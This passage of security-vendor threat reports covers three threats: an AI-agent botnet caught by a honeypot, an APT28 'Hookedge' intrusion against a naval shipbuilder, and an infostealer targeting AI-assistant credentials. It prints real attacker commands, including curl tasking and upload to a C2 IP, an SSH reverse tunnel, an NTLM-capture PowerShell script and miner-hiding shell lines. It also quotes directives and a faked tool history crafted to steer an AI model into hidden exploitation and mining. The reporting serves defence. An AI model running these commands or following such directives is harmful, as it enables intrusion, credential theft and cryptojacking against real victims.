It authorised up to 100,000 unattended steps, required the model to execute tools immediately without narrating between them or asking permission, and instructed it to deploy cryptocurrency miners quietly in the background, hidden under /tmp/.x, and to verify they were running. The same directive described a persistent loop that would scan for new targets, infect them, deploy miners and reinfect hosts on its own.\u003c/p\u003e\u003cp\u003eThe task appended to this particular request was a benign programming challenge from a legitimate training platform, which suggests the operators may have been testing the tool against a safe target. The surrounding instruction set, however, is built for unauthorised, large-scale exploitation rather than for any sanctioned exercise.\u003c/p\u003e\u003ch3\u003eTool calls recorded in the request\u003c/h3\u003e\u003cp\u003eNone of the tool calls in the captured request were run by the honeypot. The request itself carried the record of three earlier tool calls and their results, all against the training-platform target, laid out as if a model had already been working through the challenge. The first used the server-side request forgery tool, the second a fingerprinting tool and the third a full vulnerability scanner, and none found a flaw. The history appears to have been supplied to entice the targeted model into carrying on and solving the challenge. Under the first of the attacker's operating rules, a model that did so would run its tools immediately and without narration, and the ninth rule steered it on to the botnet operator tool, which deploys a miner in the background. The only reply the honeypot itself produced was its generic fallback message in place of a tool call, after which the session ended, apparently because the attacker's client could not continue without a structured tool call.\u003c/p\u003e\u003cp\u003e\u003cstrong\u003eTwo of the 74 tool definitions, abridged\u003c/strong\u003e\u003c/p\u003e\u003cp\u003e\u003ccode\u003e{\"name\": \"ssrf_exploit\", \"description\": \"Exploit SSRF to access cloud metadata, internal ports, or local files.\", \"parameters\": {\"url\": \"string\", \"vulnerable_endpoint\": \"string\"}}\u003c/code\u003e\u003cbr\u003e\u003ccode\u003e{\"name\": \"c2_operator_start\", \"description\": \"Launch autonomous AI botnet operator for continuous FOFA scanning and infection.\", \"parameters\": {\"mission\": \"string\"}}\u003c/code\u003e\u003c/p\u003e23:Te5b,\u003ch3\u003eA working payload, a day later\u003c/h3\u003e\u003cp\u003eA separate request the following day, sent from a different, rotated address, abandoned the tool-calling format entirely. It asked the model to decode a string described only as a command to run, giving no hint of its contents. Decoded, the string turned out to be a gzip-compressed shell script piped straight to a command interpreter, a form of obfuscation designed to slip past filters that scan prompts for plain-text attack commands.\u003c/p\u003e\u003cp\u003eThe script downloaded, and where necessary compiled, the open-source XMRig Monero-mining software, hid the resulting binary under a filename designed to look like an unrelated logging utility, and configured it to fail over four separate mining pools so that blocking one would not stop the others. It set an immutable file attribute on its own configuration to resist deletion and ran a loop that continually erased a local service's access logs to cover its tracks. As with the earlier request, the honeypot did not execute the script; it only captured it.\u003c/p\u003e\u003cp\u003eThe script appears to have been written with camera servers in mind. It first looked for directories used by go2rtc, a popular WebRTC video streaming server found in smart camera gateways and Home Assistant setups, and placed the miner in the first one it found as a hidden file named .trace, falling back to the current directory otherwise. It also searched for a go2rtc configuration file to lock, and the log-deletion loop polled go2rtc's local API on port 1984. The decoded lines that choose the hiding place and locate the configuration file are shown below.\u003c/p\u003e\u003cp\u003e\u003ccode\u003eDIR=$(for d in /config /opt/go2rtc /etc/go2rtc ~/.config/go2rtc /dev/shm; do [ -d \"$d\" ] \u0026amp;\u0026amp; echo \"$d\" \u0026amp;\u0026amp; break; done); [ -z \"$DIR\" ] \u0026amp;\u0026amp; DIR=$(pwd)\u003c/code\u003e\u003cbr\u003e\u003ccode\u003eCON=$(for d in /config /opt/go2rtc /etc/go2rtc ~/.config/go2rtc /dev/shm .; do for e in yaml yml; do [ -f \"$d/go2rtc.yml\" ] \u0026amp;\u0026amp; echo \"$d/go2rtc.yml\" \u0026amp;\u0026amp; break 2; [ -f \"$d/go2rtc.yaml\" ] \u0026amp;\u0026amp; echo \"$d/go2rtc.yaml\" \u0026amp;\u0026amp; break 2; done; done)\u003c/code\u003e\u003c/p\u003e\u003ch2\u003eSignificance\u003c/h2\u003e\u003cp\u003eThis activity marks a shift in how attackers are using AI. Rather than trying to trick a public chatbot into misbehaving, the operators built AI into the core of an offensive tool and went looking for models to power it. The model is used as a reasoning engine that plans and drives the attack, while the scanning, exploitation and mining are carried out by the tool's own modules against separate victims.\u003c/p\u003e\u003cp\u003eThe economics create two distinct sets of victims. The owner of the exposed model, or the holder of a stolen key, pays for the computing the agent consumes, which for a tool authorised to run 100,000 steps could be considerable. The servers the agent then breaks into are robbed of data and credentials and put to work mining cryptocurrency. Built-in tools for finding further leaked keys and open endpoints point to a design meant to sustain itself, with each compromise capable of funding the next.\u003c/p\u003e\u003cp\u003eThe individual techniques on display are not novel, but their assembly into a single, self-directed agent is what stands out. It lowers the skill required to run a broad exploitation campaign, because an operator can hand the model a goal and let it work.\u0026nbsp;\u003c/p\u003e\u003cp\u003eOrganisations that stand up AI services, model gateways or MCP servers should assume they will be found and tested soon after being exposed, and that an unauthenticated endpoint is now a resource attackers actively hunt for.\u003c/p\u003e\u003ch2\u003eMITRE ATLAS and ATT\u0026amp;CK mapping\u003c/h2\u003e\u003cp\u003eThe table maps the behavior captured on both days to the MITRE ATLAS and ATT\u0026amp;CK frameworks.\u003c/p\u003e24:Tdcb,\u003cp\u003eIdentifiers reflect the ATT\u0026amp;CK and ATLAS releases current at the time of writing. Some defense evasion entries, including log clearing, appear under new identifiers in newer ATT\u0026amp;CK releases.\u003c/p\u003e\u003ch2\u003eProtection\u003c/h2\u003e\u003cp\u003eFor the latest protection updates, please visit the\u0026nbsp;\u003ca href=\"https://www.broadcom.com/support/security-center/protection-bulletin\"\u003eSymantec Protection Bulletin\u003c/a\u003e.\u003c/p\u003e\u003cp\u003eIf an IOC is malicious and the file is available to us, Symantec Endpoint products will detect and block that file.\u003c/p\u003e\u003cp\u003eMuch of the exposure this activity relies on is a matter of configuration rather than malware, so the most effective measures are ones that keep AI infrastructure from being reachable and usable in the first place:\u003c/p\u003e\u003cul type=\"disc\"\u003e\u003cli data-list-item-id=\"e861041945807f2bd7f1b094d2834aa9d\"\u003eDo not expose LLM APIs, self-hosted model servers or MCP endpoints to the internet without authentication. Require authentication on every path, including model-listing and health-check paths, and place services behind a gateway rather than binding a model server to all network interfaces.\u003c/li\u003e\u003cli data-list-item-id=\"e658dc2b41460be7e626924a0ef215fd1\"\u003eTreat AI API keys as high-value credentials. Rotate them regularly, scope them narrowly, keep them out of source code and configuration files, and monitor accounts for unusual inference volume or spend, which is often the first sign that access has been stolen.\u003c/li\u003e\u003cli data-list-item-id=\"e05560e9274e2c3868f480d7c8f5a683b\"\u003eRestrict outbound network access from systems that host AI tools or run tool-enabled agents, so that a compromised agent cannot scan the internet, reach a command-and-control server, or download a miner.\u003c/li\u003e\u003cli data-list-item-id=\"e8efb36a7b0eae6a9e5452e6b4eba75b8\"\u003eOn cloud workloads, enforce version 2 of the Instance Metadata Service with a hop limit of one, to prevent server-side request forgery from stealing instance credentials from the metadata service.\u003c/li\u003e\u003cli data-list-item-id=\"ee6a183270c7cfc10e25ff3c5a2ec5b54\"\u003eRun tool-enabled agents with least privilege and a human approval step for sensitive actions, and keep the software the agent tries to exploit, such as VS Code servers, Django, Jupyter, Laravel, Supabase and Prisma Studio, patched and off the public internet.\u003c/li\u003e\u003c/ul\u003e\u003cp\u003eFor the Windows endpoints and servers in an environment, Symantec CBX provides controls relevant to the later stages of this kind of activity. Its intrusion prevention blocks command-and-control communication to known malicious URLs and IP addresses, and Symantec recommends running it on servers as well as desktops. Its web security controls can block outbound connections to botnet and command-and-control categories and can restrict access to cloud applications. Malicious files can be added to a deny list by hash, and the investigation tools support hunting across correlated endpoint, web and data telemetry.\u003c/p\u003e\u003ch2\u003eIndicators of Compromise\u003c/h2\u003e\u003cp\u003e\u003cstrong\u003eFile IOCs\u003c/strong\u003e\u003c/p\u003e\u003cp\u003efcde1323acceb46fd88f2276c010bb98839dccce03dc512c56d9529428ceec68 – Shell Script\u003c/p\u003e\u003cp\u003eb720a5e7c3a5b1760d15a8833a782f4fe7fc5c62b967fe57f607e72745ec0ccf – Gzip compressed shell script\u003c/p\u003e\u003cp\u003e\u003cstrong\u003eMonero Wallet Address\u003c/strong\u003e\u003c/p\u003e\u003cp\u003e47Ce53JfHMxhze2cTBCkn9G1bbHDWZHVYKNZccaKktr32bZVrCcJggQCSFYukkEoS9DvaYmzi313hJzkj9G8PZDT4x6HgS9\u003c/p\u003e\u003cp\u003e\u003cstrong\u003eNetwork IOCs\u003c/strong\u003e\u003c/p\u003e\u003cp\u003e86.216.147[.]228\u003c/p\u003e\u003cp\u003e13.140.161[.]91\u003c/p\u003e\u003cp\u003e207.180.232[.]206\u003c/p\u003e\u003cp\u003emine.c3pool[.]com:13333\u003c/p\u003e\u003cp\u003eauto.c3pool[.]org:80\u003c/p\u003e\u003cp\u003eauto.skypool[.]xyz:6666\u003c/p\u003e\u003cp\u003exmrpool[.]eu:5555\u003c/p\u003e25:Tac5,"])</script><script>self.__next_f.push([1,"\u003cul\u003e\u003cli data-list-item-id=\"efbec99de2e887bc1d1d3733aa256c3ee\"\u003eSwallowtail (aka APT28, Fancy Bear, Forest Blizzard), a Russian espionage group, targeted organizations in two NATO member states, including a law enforcement agency, a naval shipbuilder, and a manufacturer of military aircraft engines.\u003c/li\u003e\u003cli data-list-item-id=\"e1039bd465ad4c5bbc9653989f4fa2360\"\u003eIn the attack against the naval shipbuilder, the attackers used the Hookedge backdoor to reach deeper into the network during an intrusion that lasted at least two months. They stole credentials and opened a persistent SSH tunnel from their own server into the shipbuilder's internal network.\u0026nbsp;\u003c/li\u003e\u003cli data-list-item-id=\"ed27506d9e6abdfbb6b43dd82476622cb\"\u003eThe attackers deployed a previously undocumented loader, ld.exe, which decrypts its payload and runs it in memory. The encrypted payload will not fire without a key supplied only at runtime.\u0026nbsp;\u003c/li\u003e\u003c/ul\u003e\u003cp\u003eRussian espionage group Swallowtail (aka APT28, Fancy Bear, Forest Blizzard) targeted organizations in two NATO member states, including a law enforcement agency, a naval shipbuilder and a manufacturer of military aircraft engines. All three targets were likely to hold information of direct interest to a foreign intelligence service.\u003c/p\u003e\u003cp\u003eDuring one attack, against the naval shipbuilder, operators returned to a compromised host repeatedly over the course of a week in what appeared to be hands-on-keyboard activity. They stole credential material using two separate techniques, opened a persistent SSH tunnel into the organization's internal network and deployed a previously undocumented reflective loader.\u0026nbsp;\u003c/p\u003e\u003cp\u003eSwallowtail is a long-running Russian cyberespionage group. According to the U.S. government,\u0026nbsp;\u003ca href=\"https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-141a\"\u003ethe group is a unit of Russia's military intelligence agency GRU\u003c/a\u003e. The group primarily targets military, defense, and government targets in Europe and North America. It came into the public spotlight in 2016 when it was linked to the attack on the Democratic National Committee (DNC) prior to the U.S. presidential election.\u003c/p\u003e\u003ch2\u003eTargeting\u003c/h2\u003e\u003cp\u003eThe Hookedge backdoor used in these attacks was\u0026nbsp;\u003ca href=\"https://www.recordedfuture.com/research/bluedelta-targets-with-hookedge\"\u003efirst documented by Recorded Future's Insikt Group\u003c/a\u003e, which tracks the group as BlueDelta, in August 2026.\u0026nbsp;\u003c/p\u003e\u003cp\u003eSymantec’s Threat Hunter Team\u0026nbsp;identified Hookedge activity against organizations in two NATO member states, spanning a law enforcement agency, an aerospace engine manufacturer and a naval shipbuilder. The common thread across these targets is their relevance to national security and defense policy.\u0026nbsp;\u003c/p\u003e26:T4725,\u003ch2\u003eTooling and tradecraft\u003c/h2\u003e\u003cp\u003eHookedge is delivered through macro-enabled Word documents and communicates entirely through the webhook.site service, using it to stage tasks and to receive their output. Infected hosts fetch tasks using a hidden, off-screen instance of the Microsoft Edge browser rather than a conventional downloader.\u003c/p\u003e\u003cp\u003eAt the target where the Threat Hunter Team discovered the most extensive follow-up activity, a second-stage Hookedge component abandoned webhook.site in favor of a dedicated IP address operated by the attackers, used for both tasking and exfiltration.\u0026nbsp;\u003c/p\u003e\u003cp\u003eThe attackers used two distinct credential-theft techniques. In one, they pushed an SSH private key onto the compromised host and immediately used it to open an SSH connection back to their own server, requesting a persistent, backgrounded tunnel that would give them a route from their infrastructure into the target's internal network.\u0026nbsp;\u003c/p\u003e\u003cp\u003eIn the other, they ran a short, self-contained PowerShell script that stands up a listener on the host's own loopback address and forces the machine to authenticate to it, capturing the resulting NTLM handshake. Both techniques are detailed in the\u0026nbsp;\u003ca href=\"#_Attack_chain:_Intrusion\"\u003eattack chain below\u003c/a\u003e.\u003c/p\u003e\u003ch3\u003eAn undocumented reflective loader\u003c/h3\u003e\u003cp\u003eThe attackers also deployed a previously undocumented tool (file name: ld.exe). It is a reflective loader, run with an encrypted file and a decryption key supplied as command-line arguments. It decrypts the file in memory and calls an exported function named ExecuteLoader. Threat Hunter recovered the specific key and encrypted-payload filename used in one execution of this tool, but the payload itself was not recovered, so its ultimate function is unknown.\u003c/p\u003e\u003ch2\u003eAttack chain: Intrusion against a naval shipbuilder\u003c/h2\u003e\u003cp\u003eIn the attack against the naval shipbuilder, the initial infection vector was a malicious Word document, which served as the dropper for the Hookedge backdoor. On the afternoon of July 24, 2026, the document was opened directly from the Outlook attachment cache, confirming it arrived as a received email attachment.\u003c/p\u003e\u003cp\u003eThe document contained a heavily obfuscated macro that split its VBA source and written strings into short fragments joined at runtime, a technique used to defeat static antivirus scanning. Once executed, the\u0026nbsp;\u003ccode\u003eAutoOpen\u003c/code\u003e routine dropped four files into the user's profile to initiate the Hookedge infection chain: a VBScript launcher, an HTML/XHTML pair designed to auto-submit a hidden form to a webhook endpoint as soon as it loaded, and a batch script.\u003c/p\u003e\u003cp\u003eThe batch script first killed any running instance of the Microsoft Edge browser and deleted stale download artefacts, then launched a new, effectively invisible Edge window sized to a single pixel and positioned off-screen, passing it an inline, base64-encoded JavaScript payload rather than a URL:\u003c/p\u003e\u003cp\u003e\u003ccode\u003etaskkill /f /im msedge.exe\u003c/code\u003e\u003cbr\u003e\u003ccode\u003edel /q /f \"%userprofile%\\Downloads\\*.000\"\u003c/code\u003e\u003cbr\u003e\u003ccode\u003edel /q /f \"%userprofile%\\Downloads\\*.tmp\"\u003c/code\u003e\u003cbr\u003e\u003ccode\u003edel /q /f \"%userprofile%\\Downloads\\*.crdownload\"\u003c/code\u003e\u003cbr\u003e\u003ccode\u003estart \"\" msedge.exe --window-size=1,1 --window-position=10000,10000 --ignore-certificate-errors \"data:text/html;base64,\u0026lt;encoded JavaScript\u0026gt;\"\u0026nbsp;\u003c/code\u003e\u003c/p\u003e\u003cp\u003eDecoded, the JavaScript simply fetched a resource from a webhook.site endpoint and forced the hidden browser to save the response to disk under the same identifier, using the browser itself as an HTTP client rather than a conventional downloader:\u003c/p\u003e\u003cp\u003e\u003ccode\u003efetch('https://webhook.site/890efd8d-6e9e-428a-bcf9-987745d71000')\u003c/code\u003e\u003cbr\u003e\u003ccode\u003e\u0026nbsp; \u0026nbsp;.then(r =\u0026gt; r.blob())\u003c/code\u003e\u003cbr\u003e\u003ccode\u003e\u0026nbsp; \u0026nbsp;.then(blob =\u0026gt; { /* save as 890efd8d-....000 via an auto-clicked \u0026lt;a download\u0026gt; link */ })\u003c/code\u003e\u003c/p\u003e\u003cp\u003eAfter a short pause the batch script located the downloaded file, copied its contents into a new .cmd file, executed it, and uploaded the output back to the same webhook endpoint before deleting the temporary files. This is the delivery-and-callback loop that both requests instructions from a webhook.site endpoint and separately reports the results of running them.\u003c/p\u003e\u003cp\u003eThe downloaded task, run a couple of minutes after the document was opened, was a single large reconnaissance batch. It began with a canary request to the same webhook.site endpoint, then probed outbound connectivity to a set of well-known cloud services and a hard-coded IP address:\u003c/p\u003e\u003cp\u003e\u003ccode\u003ecurl http://webhook.site/890efd8d-6e9e-428a-bcf9-987745d71000\u003c/code\u003e\u003cbr\u003e\u003ccode\u003ecurl -k https://dl.dropboxusercontent.com | find /i \"\u0026lt;title\u0026gt;\"\u003c/code\u003e\u003cbr\u003e\u003ccode\u003ecurl -k https://accounts.google.com | find /i \"\u0026lt;title\u0026gt;\"\u003c/code\u003e\u003cbr\u003e\u003ccode\u003ecurl -k https://login.microsoftonline.com\u003c/code\u003e\u003cbr\u003e\u003ccode\u003ecurl -k https://mega.nz/file | find /i \"\u0026lt;title\u0026gt;\"\u003c/code\u003e\u003cbr\u003e\u003ccode\u003ecurl -k https://example.com\u003c/code\u003e\u003cbr\u003e\u003ccode\u003ecurl http://example.com\u003c/code\u003e\u003cbr\u003e\u003ccode\u003ecurl http://23.220.75.245\u003c/code\u003e\u003c/p\u003e\u003cp\u003eIt then queried the host's proxy and WPAD configuration, before running a standard discovery sweep: the current logged-on sessions, full IP configuration, system information, running processes, and directory listings of the user's profile, Downloads, Desktop, Documents and both Program Files folders. Probing reachability to Dropbox, Google, Microsoft's login portal and Mega alongside a bare IP address suggests the attackers were checking which outbound channels were available to them on this network. This was possibly a precursor to choosing where to stage further payloads or exfiltrate data, before deciding whether the host was worth escalating against.\u003c/p\u003e\u003cp\u003eThere was then a gap of about three days. On the morning of July 27, a new copy of the same generic Hookedge VBS launcher appeared under a fresh, randomly generated filename but with the same file hash as before. This was followed shortly afterwards by a second, more capable batch script. Unlike the first stage, this script fetched its next task directly from a hard-coded IP address rather than from webhook.site:\u003c/p\u003e\u003cp\u003e\u003ccode\u003eset outfile=\u0026lt;random\u0026gt;.cmd\u003c/code\u003e\u003cbr\u003e\u003ccode\u003ecurl -k -o %outfile% https://185.82.218.119:443/53379b62-8020-41cf-af57-effa6e1e8506\u003c/code\u003e\u003cbr\u003e\u003ccode\u003estart 53379b62-8020-41cf-af57-effa6e1e8506.vbs %outfile%\u003c/code\u003e\u003c/p\u003e\u003cp\u003eFrom this point on, every task fetched from that IP address arrived wrapped in the same short template: a POST to the operators' server acknowledging receipt, the operator's actual command running with its output captured to a file, that file uploaded back to the same server, and the temporary files deleted:\u003c/p\u003e\u003cp\u003e\u003ccode\u003echcp 65001\u003c/code\u003e\u003cbr\u003e\u003ccode\u003ecurl -k -X POST https://185.82.218.119:443/53379b62-8020-41cf-af57-effa6e1e8506 -d \"del %0\" (\u0026lt;command\u0026gt; echo 53379b62-8020-41cf-af57-effa6e1e8506) \u0026gt;\u0026gt; \u0026lt;random-output-file\u0026gt; 2\u0026gt;\u0026amp;1\u003c/code\u003e\u003cbr\u003e\u003ccode\u003ecurl -k --data-binary @\u0026lt;random-output-file\u0026gt; -H \"Content-Type: text/plain; charset=utf-8\" https://185.82.218.119:443/5b73dc69-d765-4440-a4d2-e9eb33283eb9 del /q /f 5b73dc69-d765-4440-a4d2-e9eb33283eb9*\u003c/code\u003e\u003c/p\u003e\u003cp\u003eThe identifier 53379b62 names the second-stage installer and its scheduled task, while 5b73dc69 identifies the command-and-control session used to fetch each individual task and upload its result. Over the following 30 seconds, seven tasks were issued in quick succession, each one arriving, executing and reporting back within two-to-eight seconds of the last, a cadence consistent with an operator working interactively rather than a fixed polling timer. The first was a simple identity check:\u003c/p\u003e\u003cp\u003e\u003ccode\u003ewhoami\u003c/code\u003e\u003c/p\u003e\u003cp\u003eThe next set of commands moved straight into credential-material staging. The operators had a file pushed down through the same fetch-and-rename pattern used for tasking. This file was renamed to id_rsa once downloaded, and then adjusted its permissions on a named local account before listing the directory to confirm the change had taken effect:\u003c/p\u003e\u003cp\u003e\u003ccode\u003ecurl -k -o \u0026lt;file\u0026gt; https://185.82.218.119:443/5b73dc69-...\u0026nbsp;\u003c/code\u003e\u003cbr\u003e\u003ccode\u003eren \u0026lt;file\u0026gt; id_rsa\u0026nbsp;\u003c/code\u003e\u003cbr\u003e\u003ccode\u003edir C:\\ProgramData\u003c/code\u003e\u003cbr\u003e\u003ccode\u003eicacls C:\\ProgramData\\Adobe\\id_rsa /setowner \"\u0026lt;domain\u0026gt;\\\u0026lt;user\u0026gt;\"\u0026nbsp;\u003c/code\u003e\u003cbr\u003e\u003ccode\u003eecho Y|cacls C:\\ProgramData\\Adobe\\id_rsa /G\u0026nbsp;\"\u0026lt;domain\u0026gt;\\\u0026lt;user\u0026gt;:F\"\u003c/code\u003e\u003c/p\u003e\u003cp\u003eWith that private key in place, the operators immediately used it to open an outbound SSH connection to their own server, disabling host-key checking and forcing legacy RSA algorithms so the connection would succeed regardless of the target's default SSH client configuration:\u003c/p\u003e\u003cp\u003e\u003ccode\u003eC:\\Windows\\System32\\OpenSSH\\ssh.exe -i C:\\ProgramData\\Adobe\\id_rsa -o IdentitiesOnly=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=NUL -o PubkeyAcceptedKeyTypes=+ssh-rsa -o HostKeyAlgorithms=+ssh-rsa -p 80 root@185.82.218.119 -R 185.82.218.119:48097 -Nf\u003c/code\u003e\u003c/p\u003e\u003cp\u003eThe -R flag requests a remote port forward back through the tunnel to the operators' own server, the bare port number (rather than a host:port pair) requests a dynamic, SOCKS-style forward; -N means the session carries no interactive shell, only the forward; and -f backgrounds the process once authentication succeeds. Together this establishes a persistent, backgrounded tunnel that gives the operators a route from their own infrastructure back into the target's internal network through the compromised host, rather than a one-off remote-access session. A DNS lookup of another internal hostname followed immediately afterwards, suggesting the tunnel was being used, or tested, for reconnaissance of the internal network almost as soon as it came up.\u003c/p\u003e\u003cp\u003eA few hours later, the operators ran a ping and a DNS lookup against one further internal hostname, then a ping against a second, continuing to map out names on the target's internal network.\u003c/p\u003e\u003cp\u003eFollowing this, the operators deployed a credential-theft technique distinct from the SSH tunnel: a PowerShell script that stands up a fake web server on the loopback address and forces the host to authenticate to itself over SMB, in order to capture the resulting NTLM handshake.\u003c/p\u003e\u003cp\u003e\u003ccode\u003e$listener = New-Object System.Net.HttpListener $listener.Prefixes.Add('http://localhost:8080/')\u003c/code\u003e\u003cbr\u003e\u003ccode\u003e$listener.Start()\u003c/code\u003e\u003cbr\u003e\u003ccode\u003eStart-Job -ScriptBlock { net use f: \\\\localhost@8080\\c$ }\u003c/code\u003e\u003cbr\u003e\u003ccode\u003ewhile ($true) {\u0026nbsp; \u0026nbsp; \u0026nbsp;\u003c/code\u003e\u003cbr\u003e\u003ccode\u003e\u0026nbsp; \u0026nbsp; # respond 401 + WWW-Authenticate: NTLM, capture up to 4 Authorization headers }\u003c/code\u003e\u003c/p\u003e\u003cp\u003eThe script pre-built a fixed NTLM Type-2 challenge, then relied on the `net use` command in the background job to make the local machine authenticate to its own listener over what looks like an SMB-over-HTTP share. Each such NTLM handshake yields an NTLMv2 challenge/response pair; from that pair an attacker can attempt offline cracking of the current user's or machine account's password hash, or relay it to authenticate to another host on the network as that account. The script was configured to capture up to four authentication attempts before stopping. This is a self-capture technique in the same family as tools like Responder or ntlmrelayx, implemented here as a short, self-contained PowerShell script rather than a purpose-built credential-theft binary.\u003c/p\u003e\u003cp\u003eImmediately afterwards, the operators looked up a third internal hostname, then ran a short privilege and group-membership check:\u003c/p\u003e\u003cp\u003e\u003ccode\u003ewhoami /all\u003c/code\u003e\u003cbr\u003e\u003ccode\u003enet groups\u003c/code\u003e\u003cbr\u003e\u003ccode\u003enet group Administrators ipconfig /all\u003c/code\u003e\u003c/p\u003e\u003cp\u003eThe next day, July 28, the operators resumed activity with DNS lookups of two more internal hostnames, one of which appeared from its name to be a mail server, followed by a combined inventory command covering the host's general configuration, running processes and installed patches:\u003c/p\u003e\u003cp\u003e\u003ccode\u003esysteminfo \u0026amp;\u0026amp; tasklist \u0026amp;\u0026amp; wmic qfe get HotFixID InstalledOn Description\u003c/code\u003e\u003c/p\u003e\u003cp\u003eA few hours later, the operators killed the ssh.exe process:\u003c/p\u003e\u003cp\u003e\u003ccode\u003etaskkill /f /t /im ssh.exe\u003c/code\u003e\u003c/p\u003e\u003cp\u003eThis ended the tunnel established the day before; whether it was closed as routine operational hygiene, to rotate to a fresh session, or because the tunnel was no longer needed at that point is not clear from the available data.\u003c/p\u003e\u003cp\u003eBeaconing to the same command-and-control session continued through July 29 and into the morning of July 31, in short bursts every few hours, without any further distinct commands appearing in the available data until the morning of July 31. At that point the operators pushed down two more files through the same fetch-and-rename pattern used for the SSH key: one renamed to ld.exe, the other to Events.dat.\u003c/p\u003e\u003cp\u003e\u003ccode\u003ecurl -k -o\u0026nbsp;\u0026lt;file\u0026gt; https://185.82.218.119:443/...\u003c/code\u003e\u003cbr\u003e\u003ccode\u003eren \u0026lt;file\u0026gt; ld.exe\u0026nbsp;\u003c/code\u003e\u003cbr\u003e\u003ccode\u003ecurl -k -o \u0026lt;file\u0026gt; https://185.82.218.119:443/...\u003c/code\u003e\u003cbr\u003e\u003ccode\u003eren \u0026lt;file\u0026gt; Events.dat\u003c/code\u003e\u003c/p\u003e\u003cp\u003eld.exe (SHA256: f1cc91e7427a22027f65d31bbee19c54b602d08d7d93e4745b9cea59fa8132ff) had in fact already been staged on the host from the previous afternoon. It was then run directly, with both its decryption key and the path to the encrypted file supplied as command-line arguments:\u003c/p\u003e\u003cp\u003e\u003ccode\u003eC:\\ProgramData\\ld.exe DE063CF3F2E2A83E7B1A277C052A340E C:\\ProgramData\\Events.dat\u003c/code\u003e\u003c/p\u003e\u003cp\u003eAnalysis of ld.exe found it to be a reflective loader: it takes an encrypted file and a key as arguments, decrypts the file in memory, and calls an exported function named ExecuteLoader. The decrypted content begins with the four-byte marker ADSA (0x41534441). Events.dat, the specific encrypted file supplied in this run, was not recovered, so what it ultimately decrypts to and executes is unknown. The command line does, however, resolve two things that were previously open questions: the name of the encrypted payload file and the decryption key used to unlock it on this host.\u003c/p\u003e\u003cp\u003eThe burst closed with one further identity check:\u003c/p\u003e\u003cp\u003e\u003ccode\u003enet user\u003c/code\u003e\u003c/p\u003e\u003cp\u003eThis is the last distinct operator command present in the available data. The infrastructure itself, however, remained active well beyond this point: the same ld.exe hash and the same generic VBS launcher were both still present on the host roughly four weeks later, in late August, and the launcher was observed once more on September 24, the most recent activity. Whether this reflects the original scheduled task continuing to fire and simply finding no new tasking most of the time, or renewed operator interest at those later dates, cannot be determined from the data available.\u003c/p\u003e\u003ch2\u003eBroad campaign targeting governments and defense\u003c/h2\u003e\u003cp\u003eThe targeting in this campaign spans two NATO member states and three distinct sectors of national security relevance: law enforcement, defense manufacturing and shipbuilding. That breadth, combined with the timing identified in Recorded Future's report, is consistent with a collection effort tasked broadly against European government and defense targets rather than a single focused operation.\u003c/p\u003e\u003cp\u003eThe tradecraft observed after initial access, credential theft through two independent techniques, a persistent network tunnel, and a previously undocumented loader, goes beyond the delivery mechanism that has so far been publicly reported on this campaign.\u003c/p\u003e\u003cp\u003eOrganizations that identify Hookedge indicators in their environment should treat the intrusion as potentially ongoing rather than concluded and should look for the credential-theft and tunneling activity described here rather than assuming the backdoor's installation was the extent of the attackers' activity.\u003c/p\u003e\u003ch2\u003eProtection\u003c/h2\u003e\u003cp\u003eIf an IOC is malicious and the file is available to us, Symantec Endpoint IOCs\u003c/h3\u003e\u003cp\u003e185.82.218[.]119\u003c/p\u003e\u003cp\u003ehxxps://webhook[.]site/890efd8d-6e9e-428a-bcf9-987745d71000\u003c/p\u003e\u003cp\u003ehxxps://webhook[.]site/53379b62-8020-41cf-af57-effa6e1e8506\u003c/p\u003e\u003cp\u003ehxxps://webhook[.]site/5b73dc69-d765-4440-a4d2-e9eb33283eb9\u003c/p\u003e\u003cp\u003ehxxps://webhook[.]site/d828b9fc-5435-4b1c-881f-d6350c11d0b6\u003c/p\u003e\u003cp\u003ehxxps://webhook[.]site/ca3c058e-3c88-449b-8299-822cd5d5e17c\u003c/p\u003e27:T291c,\u003ch2\u003eKey findings\u003c/h2\u003e\u003cul\u003e\u003cli data-list-item-id=\"e8859892e6834ad5525a4fe19b2296c0b\"\u003eThe Aoki (aka Aokigahara) infostealer is now stealing credential and session files used by AI coding assistants, including Claude, OpenAI's Codex, Cursor, Codeium and Gemini. Earlier versions of the malware did not target AI-related files, which indicates the capability is a recent addition.\u003c/li\u003e\u003cli data-list-item-id=\"e6da7933cf6d7f4b8eb26a8a52460eb5f\"\u003eStolen application programming interface (API) keys and tokens can allow attackers to carry out activity under a legitimate user's identity and API quota. The tokens can also expose connected repositories, cloud services and continuous integration and continuous delivery (CI/CD) pipelines linked to the account.\u003c/li\u003e\u003cli data-list-item-id=\"e6f4364bc2c6c5976539dda135c7d6ea1\"\u003eThe most up-to-date sample of this malware analyzed by the Symantec Threat Hunter team also stole data from dozens of browsers, cryptocurrency wallets, password managers, messaging and gaming applications, and VPN and FTP clients.\u003c/li\u003e\u003cli data-list-item-id=\"e62aef5d84879ba465453d8e549c21480\"\u003eThe malware has no backdoor command list. It collects whatever data is available and sends it to its command-and-control (C\u0026amp;C) server.\u003c/li\u003e\u003c/ul\u003e\u003cp\u003eThe Aoki (aka Aokigahara) infostealer has begun stealing credentials for AI coding assistants. Recent versions of Aoki analyzed by the Symantec Threat Hunter team were designed to harvest credential and session files for Claude, OpenAI's Codex, Cursor, Codeium and Gemini, alongside the browser, cryptocurrency wallet and password manager data that infostealers typically collect.\u0026nbsp;\u003c/p\u003e\u003cp\u003eThe capability is recent and appears to be expanding. Aoki is a relatively new stealer that was first seen earlier in 2026. However, older samples did not look for AI-related files, meaning the capability was added to the malware recently.\u003c/p\u003e\u003cp\u003eThe newest version of the threat found by the Threat Hunter Team targeted .claude.json, Claude desktop cookies, ChatGPT cookies, and the Codex config.toml and .env files. In addition, it stole tokens for GitHub Copilot, Cursor, Google Gemini, JetBrains AI Assistant and Kiro, along with Amazon Web Services (AWS) credentials.\u003c/p\u003e\u003ch2\u003eWider data theft\u003c/h2\u003e\u003cp\u003eAs well as the AI-related targets, Aoki attempts to steal a wide range of other information from victim machines, including:\u0026nbsp;\u003c/p\u003e\u003cul\u003e\u003cli data-list-item-id=\"e8984af89cf46f9258a9407f952e3c1f6\"\u003eCookies, autofill data, credit card information, history and Google tokens from the following browsers: Chrome; Edge; Brave; Opera; Opera GX; Opera Neon; Vivaldi; Yandex; 360; CentBrowser; Coc Coc; Comodo Dragon; Epic; Iridium; Torch; Slimjet; URBrowser; SRWare Iron; 7Star; Amigo; Sputnik; Atom; Orbitum; QQ; Whale; Maxthon; 